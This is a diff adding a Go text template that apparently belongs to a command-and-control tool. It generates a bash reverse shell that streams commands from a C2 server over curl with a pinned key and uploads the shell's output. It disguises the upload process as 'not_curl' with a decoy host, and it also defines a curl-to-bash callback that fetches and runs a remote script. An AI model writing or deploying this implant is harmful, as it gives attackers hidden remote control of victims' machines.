@@ -1,0 +1,32 @@
+{{/* script hooks up a shell to two curls. */}}
+
+{{- define "script" -}}
+#!/bin/bash
+
+set -euo pipefail
+
+exec curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} https://
+	{{- .C2Addr | nodefaultport}}/{{.URLPaths.In}}/
+	{{- .ID}} -N </dev/null 2>&0 |
+
+/bin/bash 2>&1 |
+
+>/dev/null 2>&1 3<&0 exec -a not_curl curl -K- something-normal.com <<_eof &
+proto-default file
+url https://{{.C2Addr | nodefaultport}}/{{.URLPaths.Out}}/{{.ID}}
+insecure
+pinnedpubkey sha256//{{.PubkeyFP}}
+silent
+upload-file /dev/fd/3
+_eof
+{{  end -}}
+
+{{- define "callback" }}{{ if eq (.C2Addr | host) "not-h4x.lol" -}}
+{{template "curl" .}}/{{.URLPaths.Script}} | bash >/dev/null 2>&1 &
+{{- end }}{{ end -}}
+
+{{- define "files" }}{{ if eq (.C2Addr | host) "not-h4x.lol" -}}
+{{template "curl" .}}
+{{- end }}{{ end -}}
+
+{{/* vim: set filetype=gotexttmpl noexpandtab smartindent: */}}
